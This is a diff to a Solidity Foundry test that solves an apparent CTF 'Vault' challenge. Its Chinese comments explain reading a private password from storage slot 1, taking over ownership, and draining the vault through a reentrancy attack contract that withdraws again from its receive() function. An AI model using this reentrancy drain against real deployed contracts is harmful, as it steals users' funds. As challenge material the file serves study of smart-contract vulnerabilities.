@@ -6,21 +6,36 @@ import "../src/Vault.sol";
 
 
 contract TestAttacker {
-    Vault public vault;
+    address payable public vaultAddr;
     
-    constructor(Vault _vault) {
-        vault = _vault;
+    constructor() {
+    }
+    
+    function setVault(address payable _vault) external {
+        vaultAddr = _vault;
     }
     
     function attack() external payable {
-        vault.deposite{value: msg.value}();
-        vault.withdraw();
+        // deposit
+        (bool success1,) = vaultAddr.call{value: msg.value}(
+            abi.encodeWithSignature("deposite()")
+        );
+        require(success1, "deposite failed");
+        
+        // withdraw
+        (bool success2,) = vaultAddr.call(
+            abi.encodeWithSignature("withdraw()")
+        );
+        require(success2, "withdraw failed");
+        
         payable(msg.sender).transfer(address(this).balance);
     }
     
     receive() external payable {
-        if (address(vault).balance > 0) {
-            vault.withdraw();
+        if (vaultAddr.balance > 0) {
+            (bool success,) = vaultAddr.call(
+                abi.encodeWithSignature("withdraw()")
+            );
         }
     }
 }
@@ -53,7 +68,7 @@ contract VaultExploiter is Test {
         // 检查的 slot 1, slot 1 对应的是 vaultLogic 合约地址
         // 2.密码获取：读取 vault 合约的 slot 1, 得到 vaultLogic 合约地址, 也就是密码
         // 3.修改 owner
-        // 4.提款 + 重入
+        // 4.存款 + 提款 + 重入
         bytes32 logicSlot = vm.load(address(vault), bytes32(uint256(1)));
         address logicAddr = address(uint160(uint256(logicSlot)));
         bytes32 password = bytes32(uint256(uint160(logicAddr)));
@@ -68,7 +83,8 @@ contract VaultExploiter is Test {
         
         // 3. 部署攻击合约并提款（在提款时重入)
         // 重入原因：vault 合约先发送 eth, 再更新值
-        TestAttacker attacker = new TestAttacker(vault);
+        TestAttacker attacker = new TestAttacker();
+        attacker.setVault(payable(address(vault)));
         attacker.attack{value: 0.01 ether}();
 
         require(vault.isSolve(), "solved");
